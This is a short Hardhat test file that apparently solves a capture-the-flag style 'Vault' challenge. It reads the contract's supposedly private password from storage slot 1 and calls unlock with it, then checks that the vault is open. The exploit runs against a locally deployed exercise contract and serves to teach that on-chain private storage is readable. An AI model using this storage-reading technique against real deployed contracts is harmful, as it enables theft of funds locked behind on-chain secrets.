import { expect } from "chai";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";


describe("Vault", async () =>{

  it("Should execute vault exploit", async () =>{
    await deployments.fixture(["Vault"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc= await ethers.getSigner(exploiter)
    const vaultDeployment=await deployments.get('Vault')
    const vault = await ethers.getContractAt('Vault',vaultDeployment.address)
    
    console.log(`Slot 0: ${await ethers.provider.getStorageAt(vault.address,0)}`)
    console.log(`Slot 1: ${await ethers.provider.getStorageAt(vault.address,1)}`)

    const tx=await vault.connect(exploiterAcc).unlock(await ethers.provider.getStorageAt(vault.address,1))
    await tx.wait()
    
    expect(await vault.locked(),"Vault keeps locked").to.be.false
    
  });
});
